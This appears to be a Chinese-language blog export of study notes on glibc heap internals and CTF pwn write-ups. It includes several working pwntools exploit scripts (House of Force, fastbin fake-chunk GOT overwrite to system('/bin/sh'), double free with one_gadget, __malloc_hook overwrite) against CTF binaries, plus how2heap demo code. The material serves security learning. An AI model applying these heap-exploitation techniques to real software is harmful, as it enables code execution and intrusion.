的内部仍然会有多个互不相关的链表来保存不同大小的chunk。在这里我们主要学习的两种bin：fastbins和unsorted bin。 astbinY数组：大小为10。记录的是fast bin链 bins数组：大小为129。记录的是unsorted bin（1）、small bin（263）、large bin链（64126） fastbins:fast bin的个数——10个 每个fast bin都是一个单链表(只使用fd指针) glibc以单链表结构对其进行管理，且每个bin采取的是LIFO（后进先出，跟栈类似）的策略，即最近释放的chunk会被优先分配，同时fastbin中的chunk的P位设为1，不会进行合并操作。 fastbin大小（注：以下的大小都为mem的大小，实际chunk的空间还要加上chunk_head（64位为16字节，32位为8字节）) fastbins中最多有10个bin： chunk的大小在32字节128字节（0x200x80）的chunk称为“fast chunk”（大小不是malloc时的大小，而是在内存中struct malloc_chunk的大小，包含前2个成员）· 每个fast bin链表都是单链表（使用fd指针）。因此，fast bin中无论是添加还是移除fast chunk，都是对“链表尾”进行操作，而不会对某个中间的fast chunk进行操作 unsorted bin只有一个 unsorted bin, 进行内存分配查找时先在 Fastbins, small bins 中查找, 之后会在 unsorted bin 中进行查找, 并整理 unsorted bin 中所有的 chunk 到 Bins 中对应的 Bin. unsorted bin 位于 bin[1]. unsorted_bin-&gt;fd 指向双向环链表的头结点, unsorted_bin-&gt;bk 指向双向环链表的尾节点, 在头部插入新的节点. Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO small bins, large binsSmall Bin¶small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size = 2 * SIZE_SZ *index，具体如下 下标 SIZE_SZ=4（32 位） SIZE_SZ=8（64 位） 2 16 32 3 24 48 4 32 64 5 40 80 x 24x 28x 63 504 1008 对于 chunk size &lt; 512, 是存放在 small bins, 有 64 个, 每个 bin 是以 8 bytes 作为分割边界, 也就相当于等差序列, 举个例子: small bins 中存放的第一个 chunk 双向环链表 全部都是由 size 为 16 bytes 大小的 chunk 组成的, 第二个 chunk 双向环链表 都是由 size 为 16+8 bytes 大小的 chunk 组成的. 但是对于 large bins, 分割边界是递增的, 举个简单例子: 前 32 个 large bins 的分割边界都是 64 bytes, 之后 16 个 large bins 的分割边界是 512 bytes. 以上仅为字长为 32 位的情况下, 具体请参考如下. eglibc-2.19/malloc/malloc.c:1436 /* Indexing Bins for sizes &lt; 512 bytes contain chunks of all the same size, spaced 8 bytes apart. Larger bins are approximately logarithmically spaced: 64 bins of size 8 32 bins of size 64 16 bins of size 512 8 bins of size 4096 4 bins of size 32768 2 bins of size 262144 1 bin of size what's left There is actually a little bit of slop in the numbers in bin_index for the sake of speed. This makes no difference elsewhere. The bins top out around 1MB because we expect to service large requests via mmap. Bin 0 does not exist. Bin 1 is the unordered list; if that would be a valid chunk size the small bins are bumped up one. */ top chunk 位于最高地址. large bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下： 组 数量 公差 1 32 64B 2 16 512B 3 8 4096B 4 4 32768B 5 2 262144B 6 1 不限制 寻找堆分配函数realloc malloc calloc通常来说堆是通过调用 glibc 函数 malloc 进行分配的，在某些情况下会使用 calloc 分配。calloc 与 malloc 的区别是 calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的。 calloc(0x20); //等同于 ptr=malloc(0x20); memset(ptr,0,0x20); 1234 除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数的功能。realloc 的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时如果申请 size &gt; 原来 size如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)如果申请 size &lt; 原来 size如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作 free函数free()函数free掉chunk时先判断 chunk 的大小和所处的位置，若 chunk_size &lt;= max_fast，并且 chunk 并不位于 heap 的顶部，也就是说并不与 top chunk 相邻，则将 chunk 放到 fast bins 中，chunk 放入到 fast bins 中，释放便结束了，程序从 free()函数中返回。 ptmalloc 的响应判断所需分配chunk的大小是否满足chunk_size &lt;= max_fast (max_fast 默认为 64B)， 如果是的话，先尝试在 fast bins 中取一个所需大小的 chunk 分配给用户。 前一个块（由当前块头指针加pre_size确定），后一个块（由当前块头指针加size确定）。从而，在合并堆块时会存在两种情况：向后合并、向前合并。当前一个块和当前块合并时，叫做向后合并。当后一个块和当前块合并时，叫做向前合并。 危险函数输入 gets，直接读取一行，忽略 ‘\\x00’ scanf vscanf 输出 sprintf 字符串 strcpy，字符串复制，遇到 ‘\\x00’ 停止 strcat，字符串拼接，遇到 ‘\\x00’ 停止 bcopy 确定填充长度这一部分主要是计算我们开始写入的地址与我们所要覆盖的地址之间的距离。 一个常见的误区是 malloc 的参数等于实际分配堆块的大小，但是事实上 ptmalloc 分配出来的大小是对齐的。这个长度一般是字长的 2 倍，比如 32 位系统是 8 个字节，64 位系统是 16 个字节。但是对于不大于 2 倍字长的请求，malloc 会直接返回 2 倍字长的块也就是最小 chunk，比如 64 位系统执行malloc(0)会返回用户区域为 16 字节的块。 HOFtop chunk的作用是作为后备堆空间 篡改top chunk的size为-1，然后劫持到任意内存 这种攻击手段成为House of force（hof），能够进行hof攻击需要满足两个条件： 用户能够篡改top chunk的size字段（篡改为负数或很大值） 用户可以申请任意大小的堆内存（包括负数） main_arenamalloc_hook位于main_arena(如果不知道main_arena地址可以直接使用命令 x/20xg &amp;main_arena 查看内存和地址)往上，offset = 0x10: unsortedbin —&gt;main_arena+88的地址 Fast bin在chunk被free的时候如果大小小于0x80会被放入fast bin需要注意的是这里的prive_inuse位不会置0可以在这里泄露出来heap的地址。 Unsort bin在chunk合并之后大于0x80或者是大于0x80的chunk被释放之后会放入unsort bin这里是双向链表连接其中main_arena和libc_base之间的偏移是固定的，可以用来leak libc_base off by one:单字节溢出off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节 **struct.pack(****format***, *v1*, *v2*, *…***)***返回一个字节对象，该对象包含根据格式字符串格式打包的值v1、v2，…。参数必须与格式要求的值完全匹配。 ***eg:h表示*short，l表示long； *‘hhl’表示后面有三个参数，依次是*short，short，long类型 **c表示 char，bytes of length 1（长度的byte数组），i表示integer 整数；’ci’*表示后面有两个个参数，依次是*char，integer 类型 &gt;&gt;&gt; from struct import * &gt;&gt;&gt; pack('hhl', 1, 2, 3) &gt;&gt;&gt; pack('ci', b'*', 0x12131415) bamboobox#!/usr/bin/python2 # -*- coding:utf-8 -*- from pwn import * import struct sh = process('./bamboobox') elf = ELF('./bamboobox') #context.log_level = \"debug\" # 创建pid文件，用于gdb调试 f = open('pid', 'w') f.write(str(proc.pidof(sh)[0])) f.close() def show_item(): pass def add_item(size, name): sh.sendline(str(2)) sh.recvuntil('Please enter the length of item name:') sh.sendline(str(size)) sh.recvuntil('Please enter the name of item:') sh.sendline(name) sh.recvuntil('Your choice:') def change_item(index, length, name): sh.sendline(str(3)) sh.recvuntil('Please enter the index of item:') sh.sendline(str(index)) sh.recvuntil('Please enter the length of item name:') sh.sendline(str(length)) sh.recvuntil('Please enter the new name of the item:') sh.sendline(name) sh.recvuntil('Your choice:') def remove_item(index): sh.sendline(str(4)) sh.recvuntil('Please enter the index of item:') sh.sendline(str(index)) sh.recvuntil('Your choice:') magic_func_addr = 0x400d49 # 清除流 sh.recvuntil('Your choice:') # 修改top chunk # 注意这里不能太小，否则会申请不到top_chunk add_item(0x108, '') # 申请的这个chunk的size为 0x110 change_item(0, 0x108 + 8 + 1, 'a'*0x108 + struct.pack('q', -1)) # top_chunk-&gt;size = -1 # any_address - (char *)top_chunk - 0x20 # (heap_base + 0x10)为目标地址，偏移 0x10 为了不把chunk头计算在内 # (heap_base + 0x20 + 0x110)为top_chunk 的地址 # (heap_base + 0x10) - (heap_base + 0x20 + 0x110) - 0x20 = -0x140 add_item(-0x140, '') add_item(0x18, 'a'*8 + p64(magic_func_addr)) # 退出程序，触发magic函数 sh.sendline('5') sh.interactive() # 删除pid文件 os.system(\"rm -f pid\") 32位 栈至顶向下扩展，并且栈是有界的。堆至底向上扩展，mmap 映射区 域至顶向下扩展，mmap 映射区域和堆相对扩展，直至耗尽虚拟地址空间中的剩余区域，这 种结构便于 C 运行时库使用 mmap 映射区域和堆进行内存分配 64位在 64 位模式下各个区域的起始位置是什么呢？对于 AMD64 系统，内存布局采用经典 内存布局，text 的起始地址为 0x0000000000400000，堆紧接着 BSS 段向上增长，mmap 映射 区域开始位置一般设为 TASK_SIZE/3。 上图是 X86_64 下 Linux 进程的默认内存布局形式，这只是一个示意图，当前内核默认 配置下，进程的栈和 mmap 映射区域并不是从一个固定地址开始，并且每次启动时的值都 不一样，这是程序在启动时随机改变这些值的设置，使得使用缓冲区溢出进行攻击更加困难 2021V&amp;Nctf：White_Give_Flag：例行检查，64位程序，保护全开6 本地试运行一下，看着像堆 64位ida载入 main（） sub_E5A qword_2010120数组中存放着5个字符串，对应菜单的5个选项。而且这个函数执行完后会在chunk中遗留flag的值 sub_F07 读取菜单选项的函数返回的是 read() 的返回值⽽不是 atoi() 的返回值，根据返回值打印qword_202120 中的字符串 通过add函数，可以看到堆的指针存放在qword_202100中，qword_202120 上⽅是堆指针，我们通过puts(qword_202120[-1])来输出chunk[3]里的内容 malloc 随机 size 写 flag 时，size 的范围是 [0x300, 0x500]。add 到 chunk[3] 时申请⼀个在范围内的size，如果恰好是带有 flag 的 chunk size，就可以把这个 chunk 取出来，然后 edit 填充 0x10 个字符， puts(qword_202120[-1]) 就能打印出 flag。size 范围不⼤，可以爆破。puts(qword_202120[-1]) 需要使 read() 返回 0，也就是读到 EOF。可以 ctrl+d，虽然需要爆破，但是纯⼿动操作理论上可⾏（不建议使⽤）。pwntools 可以使⽤ shutdown_raw(‘send’) 关闭管道的 send ⽅向，使远程 read() 读到 EOF，返回 0。 from pwn import * def menu(choice): r.recvuntil('choice:') r.sendline(choice) def add(size): menu('') r.recvuntil('size:\\n') r.sendline(str(size)) def edit(index,data): menu('111') r.recvuntil('index:\\n') r.sendline(str(index)) r.recvuntil('Content:\\n') r.send(data) def delete(index): menu('11') r.recvuntil('index:\\n') r.sendline(str(index)) def show(index): menu('1') while True: r = remote(\"node4.buuoj.cn\",39123) add(0x10) add(0x10) add(0x10) add(0x310) edit(3,'x'*0x10) r.recvuntil('choice:') r.shutdown_raw('send') flag = r.recvline() log.info(flag) if 'vnctf{' in flag or '}' in flag: exit(0) r.close() sleep(1) 漏洞点在于申请chunk存储了flag信息，在free时未清空，那么在接下来我们申请chunk的时候如果能够申请到跟free过的chunk大小一致，那么存储着flag的chunk就可被申请回来，即可读出flag ffchecksec一下 保护全开 ida查看 推测大概是chunk的申请、释放、打印、编辑，其中show函数只能够调用一次，edit函数只能调用两次。比较特殊的一个点就是该程序使用的GLIBC 2.32。 UAF漏洞1、内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。2、内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。3、内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。 0804b000-0804c000 rw-p 00000000 00:00 0 [heap] 0x0804b000 是相应堆的起始地址 rw-p 表明堆具有可读可写权限，并且属于隐私数据。 00000000 表明文件偏移，由于这部分内容并不是从文件中映射得到的，所以为 0。 00:00 是主从 (Major/mirror) 的设备号，这部分内容也不是从文件中映射得到的，所以也都为 0。 0 表示着 Inode 号。由于这部分内容并不是从文件中映射得到的，所以为 0。 fastbin#!/usr/bin/python2 #coding=utf-8 from pwn import * #p = process('./easyheap') p = remote('node4.buuoj.cn' ,27189) elf = ELF('./easyheap') context.log_level = 'debug' # 设置 Log 等级 def debug(): # 调试函数 attach to gdb gdb.attach(p) pause() def create(size,content): # 新建 heap,地址保存在 heaparray p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Size of Heap : ') p.send(str(size)) p.recvuntil('Content of heap:') p.send(str(content)) def edit(index,size,content): # 修改 heap 内容,存在堆溢出点 p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Index :') p.sendline(str(index)) p.recvuntil('Size of Heap : ') p.send(str(size)) p.recvuntil('Content of heap : ') p.send(str(content)) def free(index): # 释放 heap p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Index :') p.sendline(str(index)) free_got = elf.got['free'] create(0x68,'aaaa') # chunk 0 create(0x68,'bbbb') # chunk 1 create(0x68,'cccc') # chunk 2 free(2) # 释放 heap2 让其进入 fastbin payload = '/bin/sh\\x00' + 'a' * 0x60 + p64(0x71) + p64(0x6020b0-3) edit(1,len(payload),payload) # 修改 heap1 内容为 '/bin/sh\\x00', 以及堆溢出 heap2(freed) 修改其 fd 指针 # 因为最后释放的是 heap1,利用 '__free_hook'(system) Getshell # 为什么是 0x6020b0 - 3? 这是调试出来的 # FakeChunk 若以这里为 prev_size，则 size 正好是一个 0x000000000000007f # 可以绕过 malloc_chunk 的合法性验证 (new_chunk 的 size 位要与 bin 链表 size 一致) # 这样就伪造出了一个 chunk create(0x68,'aaaa') # chunk 2 (从 fastbin 里取出的) create(0x68,'c') # chunk 3 / idx = 0 (Fake) payload = '\\xaa' * 3 + p64(0) * 4 + p64(free_got) edit(3,len(payload),payload) # 修改 heap3 (Fake) # 作用是把 heaparray[0] 的地址 (原先记录的是 chunk 3 的地址) 覆写成 free_got 地址 # 这就是要在 heaparry 附近构造 Fakeheap 的原因 # 确定具体的偏移量需要动态调试 payload = p64(elf.plt['system']) edit(0,len(payload),payload) # free_got 地址的作用在这里体现了 # 由于 edit() 的目标是 heaparry[] 里面的地址 # 那么本次操作将修改 free_got 为 system_plt 的地址 free(1) # 当释放 chunk1 (内容为 '/bin/sh\\0x00') 的时候 # 把 chunk1 当参数传入 free() 中执行，由于 free() 地址已经被修改成 system() # 最后程序执行的就是 system(chunk1's content) 即 system('/bin/sh\\0x00'), 成功 Getshell p.interactive() 这里我们能使用的就一个堆溢出，这样就可以通过溢出来伪造堆块或者伪造指针。既然我们的攻击方法是改写got表，就应该先把堆块的指针改写为某个函数的got地址，这样在edit的时候就是改写了got里面的内容。 这里用到的攻击方式是house of spirit ，利用fastbin和堆溢出，把在fastbin链尾的堆块的fd指针（正常情况下是0x0）改写为我们精心找到的fake chunk的地址，注意这个地址要在0x6020e0（堆块指针表）前面找，这样我们malloc到fake chunk之后，通过edit就能覆写堆块指针。 from pwn import * context(os='linux',arch='amd64',log_level='debug') #sh = process('./easyheap') sh = remote(\"node3.buuoj.cn\",\"28598\") sh.sendafter('Your choice :','1\\n') #0 heap sh.sendafter('Size of Heap : ','96\\n') sh.sendafter('Content of heap:','\\n') sh.sendafter('Your choice :','1\\n') #1 heap sh.sendafter('Size of Heap : ','96\\n') sh.sendafter('Content of heap:','\\n') sh.sendafter('Your choice :','3\\n') # free 1 sh.sendafter('Index :','1\\n') x = p64(0x0) * 13 + p64(0x71) + p64(0x6020ad) + p64(0x0) sh.sendafter('Your choice :','2\\n') sh.sendafter('Index :','0\\n') sh.sendafter('Size of Heap : ','1000\\n') sh.sendafter('Content of heap : ',x) #gdb.attach(sh) sh.sendafter('Your choice :','1\\n') #1 heap sh.sendafter('Size of Heap : ','96\\n') sh.sendafter('Content of heap:','\\n') #gdb.attach(sh) sh.sendafter('Your choice :','1\\n') #2 heap (0x6020ad) sh.sendafter('Size of Heap : ','96\\n') sh.sendafter('Content of heap:','\\n') x = 'A' * 35 + p64(0x602018) #free_got sh.sendafter('Your choice :','2\\n') sh.sendafter('Index :','2\\n') sh.sendafter('Size of Heap : ','1000\\n') sh.sendafter('Content of heap : ',x) x = p64(0x400700) #system_plt sh.sendafter('Your choice :','2\\n') sh.sendafter('Index :','0\\n') sh.sendafter('Size of Heap : ','1000\\n') sh.sendafter('Content of heap : ',x) x = '/bin/sh' + '\\x00' sh.sendafter('Your choice :','2\\n') sh.sendafter('Index :','1\\n') sh.sendafter('Size of Heap : ','1000\\n') sh.sendafter('Content of heap : ',x) sh.sendafter('Your choice :','3\\n') sh.sendafter('Index :','1\\n') #gdb.attach(sh) sh.interactive() linux沙箱linux seccomp linux的沙箱机制，可以限制进程对系统调用的访问，从系统调用号，到系统调用的参数，都可以检查和限制 有两种模式 SECCOMP_MODE_STRICT, 进程只能访问read,write,_exit,sigreturn系统调用 SECCOM_MODE_FILTER，通过设置bpf规则，来过滤和检查系统调用号，和系统调用参数，来决定对进程访问系统调用的处理 systemd，container都使用seccomp机制来限定对进程的对系统调用的访问权限","link":"","categories":[{"name":"heap","slug":"heap","permalink":"https://torebtr.github.io/categories/heap/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://torebtr.github.io/tags/pwn/"}]},{"title":"how2heap(持续更新)","date":"2021-08-25T01:28:44.000Z","path":"2021/08/25/how2heap/","text":"简记how2heap刷题 first_fit假如我先malloc了一个比较大的堆，然后free掉，当我再申请一个小于刚刚释放的堆的时候，就会申请到刚刚free那个堆的地址。还有就是，我虽然刚刚释放了a指向的堆，但是a指针不会清零，仍然指向那个地址。这里就存在一个uaf（use_after_free)漏洞，原因是free的时候指针没有清零。 自己理解：总共分配了三次，第一次malloc得到的chunk被free掉之后并没有将第一次的指针清空，只是将空间归还。第三次malloc的时候，因为大小比第一次的小，所以将第一次free掉的空间又重新分配了回来，这样当我们输出a和c的时候，都是输出同一个地址的内容。 fastbin_dup#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { fprintf(stderr, \"This file demonstrates a simple double-free attack with fastbins.\\n\"); fprintf(stderr, \"Allocating 3 buffers.\\n\"); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, \"1st malloc(8): %p\\n\", a); fprintf(stderr, \"2nd malloc(8): %p\\n\", b); fprintf(stderr, \"3rd malloc(8): %p\\n\", c); fprintf(stderr, \"Freeing the first one...\\n\"); free(a); fprintf(stderr, \"If we free %p again, things will crash because %p is at the top of the free list.\\n\", a, a); // free(a); fprintf(stderr, \"So, instead, we'll free %p.\\n\", b); free(b); fprintf(stderr, \"Now, we can free %p again, since it's not the head of the free list.\\n\", a); free(a); fprintf(stderr, \"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\\n\", a, b, a, a); fprintf(stderr, \"1st malloc(8): %p\\n\", malloc(8)); fprintf(stderr, \"2nd malloc(8): %p\\n\", malloc(8)); fprintf(stderr, \"3rd malloc(8): %p\\n\", malloc(8)); } fastbin_dup_into_stack#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { fprintf(stderr, \"This file extends on fastbin_dup.c by tricking malloc into\\n\" \"returning a pointer to a controlled location (in this case, the stack).\\n\"); unsigned long long stack_var; fprintf(stderr, \"The address we want malloc() to return is %p.\\n\", 8+(char *)&amp;stack_var); fprintf(stderr, \"Allocating 3 buffers.\\n\"); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, \"1st malloc(8): %p\\n\", a); fprintf(stderr, \"2nd malloc(8): %p\\n\", b); fprintf(stderr, \"3rd malloc(8): %p\\n\", c); fprintf(stderr, \"Freeing the first one...\\n\"); free(a); fprintf(stderr, \"If we free %p again, things will crash because %p is at the top of the free list.\\n\", a, a); // free(a); fprintf(stderr, \"So, instead, we'll free %p.\\n\", b); free(b); fprintf(stderr, \"Now, we can free %p again, since it's not the head of the free list.\\n\", a); free(a); fprintf(stderr, \"Now the free list has [ %p, %p, %p ]. \" \"We'll now carry out our attack by modifying data at %p.\\n\", a, b, a, a); unsigned long long *d = malloc(8); fprintf(stderr, \"1st malloc(8): %p\\n\", d); fprintf(stderr, \"2nd malloc(8): %p\\n\", malloc(8)); fprintf(stderr, \"Now the free list has [ %p ].\\n\", a); fprintf(stderr, \"Now, we have access to %p while it remains at the head of the free list.\\n\" \"so now we are writing a fake free size (in this case, 0x20) to the stack,\\n\" \"so that malloc will think there is a free chunk there and agree to\\n\" \"return a pointer to it.\\n\", a); stack_var = 0x20; fprintf(stderr, \"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\\n\", a); *d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d)); fprintf(stderr, \"3rd malloc(8): %p, putting the stack address on the free list\\n\", malloc(8)); fprintf(stderr, \"4th malloc(8): %p\\n\", malloc(8)); } 会发现再次申请的时候就把我们伪造的栈空间当malloc来申请了，这其中的要点为将stack_var = 0x20,然后将stack_var -8 的地址赋值到*d处，也就是fastbin的fd处。再次maollc到指向stack+8的堆。 9447-search-enginehttps://www.freesion.com/article/7775459314/ 结构体： struct word { word ptr //指向每个word的起始地址 word size //每个word的大小 sentence ptr //指向句子的起始地址 sentence size //每一个句子的大小 pre_word_ptr //指向上一个word struct的指针 } 每个sentence都是用链表的方式存起来的，即句子与句子之间是指针连接 上面就是word_ptr 输入word的大小和内容，以输入的大小为size malloc一个堆。 从最后一个word struct开始找起，通过每个struct的pre_word_ptr一直向前找。 然后这里有两个check。第一，当前的word_struct的sentence ptr指向的内容不能为空。第二，当前的word_struct中的size字段要和输入的word的size大小一致，并且通过memcmp(word_struct-&gt;word_ptr, word_ptr, size)来比较输入的word内容和当前struct的word ptr指向的内容是否一致。 通过这两个check之后，分别打印该word struct对应的sentence size和内容。 询问是否删除句子，如果删除的话，就清空该sentence中的内容，并且把该word_struct中的sentence_ptr指针free掉注意这里free之后没有把指针设置为空，存在漏洞，之后可以通过double free来进行一个利用 #coding=utf-8 from pwn import * DEBUG = 1 io = process(\"./pwn\") libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\") if DEBUG: context.log_level = \"debug\" context.terminal = [\"/usr/bin/tmux\", \"splitw\", \"-h\", \"-p\", \"70\"] def index_a_sentence(sentence): io.recvuntil(\"Quit\\n\") io.sendline(\"2\") io.recvuntil(\"size:\") io.sendline(str(len(sentence))) io.recvuntil(\"sentence:\") io.sendline(sentence) def seach_word(word): io.recvuntil(\"Quit\\n\") io.sendline(\"1\") io.recvuntil(\"size:\") io.sendline(str(len(word))) io.recvuntil(\"word:\") io.sendline(word) def leak(): unsorted_bin_sentece = \"s\"*0x85 + \" m\" index_a_sentence(unsorted_bin_sentece) seach_word(\"m\") io.recvuntil(\"(y/n)?\") io.sendline(\"y\") seach_word(\"\\x00\") io.recvuntil(\"Found \" + str(len(unsorted_bin_sentece)) + \": \") main_arena_addr = u64(io.recv(6).ljust(8, \"\\x00\")) - 88 libc_addr = main_arena_addr - 0x3c4b20 io.recvuntil(\"(y/n)?\") io.sendline(\"n\") return libc_addr, main_arena_addr libc_addr, main_arena_addr = leak() print(\"libc address: \" + hex(libc_addr)) index_a_sentence(\"a\"*0x5d + \" d\") #chunk a index_a_sentence(\"a\"*0x5d + \" d\") #chunk b index_a_sentence(\"a\"*0x5d + \" d\") #chunk c seach_word(\"d\") io.recvuntil(\"(y/n)?\") io.sendline(\"y\") #free c io.recvuntil(\"(y/n)?\") io.sendline(\"y\") #free b io.recvuntil(\"(y/n)?\") io.sendline(\"y\") #free a # fastbins 0x70: a-&gt;b-&gt;c seach_word(\"\\x00\") io.recvuntil(\"(y/n)?\") io.sendline(\"y\") #free b # fastbins 0x70: b-&gt;a-&gt;b-&gt;.... # double free 构建了循环链表 io.recvuntil(\"(y/n)?\") io.sendline(\"n\") io.recvuntil(\"(y/n)?\") io.sendline(\"n\") one_gadget_addr = libc_addr + 0xf1147 fake_chunk_addr = main_arena_addr - 51 payload = p64(fake_chunk_addr).ljust(0x60, \"a\") index_a_sentence(payload) # return chunk b and edit fd # fastbins: a-&gt;b-&gt;fake_chunk notice that fake_chunk size should fall in right fastbins index index_a_sentence(\"a\"*0x60) # return chunk a index_a_sentence(\"a\"*0x60) # return chunk b whose fd has been modified payload = (\"a\"*19 + p64(one_gadget_addr)).ljust(0x60, \"a\") #gdb.attach(io) index_a_sentence(payload) io.interactive() 0ctf 2017-babyheaphttps://uaf.io/assets/0ctfbabyheap 预备知识 利用 fastbin attack 即 double free 的方式泄露 libc 基址，当只有一个 small/large chunk 被释放时，small/large chunk 的 fd 和 bk 指向 main_arena 中的地址，然后 fastbin attack 可以实现有限的地址写能力。 保护查看如果RELRO: Partial RELRO, 有可能是格式化字符串。 保护全开 函数分析 解析Leak Libc无uaf！！！ 利用double free获得指向small bin的ptr，然后利用dump打印出来 #!/usr/bin/env python # -*- coding: UTF-8 -*- from pwn import * p = process(\"./babyheap\") elf=ELF('./babyheap') libc = ELF('/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so') #context.log_level='debug' context.terminal = [\"tmux\",\"splitw\",\"-h\"] context.arch = \"amd64\" def alloc(size): p.recvuntil('Command: ') p.sendline('1') p.sendline(str(size)) def fill(idx,payload): p.recvuntil('Command: ') p.sendline('2') p.sendline(str(idx)) p.sendline(str(len(payload))) p.send(payload) def free(idx): p.recvuntil('Command: ') p.sendline('3') p.sendline(str(idx)) def dump(idx): p.recvuntil('Command: ') p.sendline('4') p.sendline(str(idx)) p.recvuntil('Content: \\n') #-------leak main_arena - unsorted bin attack ------ alloc(0x10)#idx0 alloc(0x10)#idx1 alloc(0x30)#idx2 alloc(0x40)#idx3 alloc(0x60)#idx4 fill(0,p64(0x51)*4) #idx1 -&gt; size =0x51 fill(2,p64(0x31)*6) #让被free的chunk检查到后面是在用的chunk free(1) alloc(0x40)#idx1 这个指针还是idx1的位置,但是可以读写 idx2 -&gt;fd 了 fill(1,p64(0x91)*4) #将idx2放进unsorted bin中 free(2) dump(1) p.recv(0x20) SBaddr = u64(p.recv(8)) p.recvline() malloc_hook=SBaddr-88-0x10 success('malloc_hook = '+hex(malloc_hook)) #------------ 把malloc_hook申请出来 --------------------- free(4) payload=p64(0)*9+p64(0x71)+p64(malloc_hook-0x23) fill(3,payload) alloc(0x60)#idx2 alloc(0x60)#idx4 malloc_hook #----------- 改 malloc_hook --------------------------- libc_addr = malloc_hook-libc.symbols['__malloc_hook'] success('libc = '+hex(libc_addr)) payload=p64(libc_addr+0x4526a) #0x4526a在下面解释 shllcode='a'*0x13+payload fill(4,shllcode) alloc(1) p.sendline('bash') p.interactive() 我们需要在 __malloc_hook 写一个函数地址,用来getshell 0x4526a这个偏移里写的是这东西: &lt;do_system+1098&gt;: mov rax,QWORD PTR [rip+0x37ec47] &lt;do_system+1105&gt;: lea rdi,[rip+0x147adf] &lt;do_system+1112&gt;: lea rsi,[rsp+0x30] &lt;do_system+1117&gt;: mov DWORD PTR [rip+0x381219],0x0 &lt;do_system+1127&gt;: mov DWORD PTR [rip+0x381213],0x0 &lt;do_system+1137&gt;: mov rdx,QWORD PTR [rax] &lt;do_system+1140&gt;: call 0x7f7f36b27770 &lt;execve&gt; fastbin_dup_consolidate 先申请两个chunk，然后free掉p1，之后申请一个较大的chunk，使p1进入unsort bin然后再次free p1，这样再申请两次与p1大小相同的chunk，所申请的chunk的指针就指向同一个位置。 2016 HITCON CTF SleepyHolder 申请大小超过top chunk size, ptmalloc会整合一些fastbin中的free chunk并入top chunk, 如果还不够就mmap一块新的chunk，这个chunk与原有的top chunk之间采用单链表链接. Fastbin对double free的检查机制是仅仅检查fastbin的头chunk是否与当前要释放的这个相同size的chunk地址一样 *malloc_consolidate*****的功能就是把**chunk******从**fastbin******取出，相邻的**chunk******进行合并，并且会设置下一个**chunk******的**prev_inuse******位为**0** add(1, 'aaa') #small secret add(2, 'bbb') #big secret delete(1) ------------------ add(3, 'ccc') #huge secret ｜--------&gt; Double Free delete(1) ------------------ 简单点来说就是free了一次chunk1，然后申请了一块很大的chunk，chunk1会被取出来然后合并掉，实际上fastbin中没有chunk，此时再free一次就构成double free了 wiki 程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。 unsafe unlink 关键是在globle chunk当中构造fake_chunk，然后完成上图的构造 house_of_spirit通过free一块不可控内存，在进行一次malloc，使其可控 术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。 要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即 fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。 fake chunk 地址需要对齐， MALLOC_ALIGN_MASK fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。 fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。 fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { fprintf(stderr, \"This file demonstrates the house of spirit attack.\\n\"); fprintf(stderr, \"Calling malloc() once so that it sets up its memory.\\n\"); malloc(1); fprintf(stderr, \"We will now overwrite a pointer to point to a fake 'fastbin' region.\\n\"); unsigned long long *a; // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) unsigned long long fake_chunks[10] __attribute__ ((aligned (16))); fprintf(stderr, \"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\\n\", 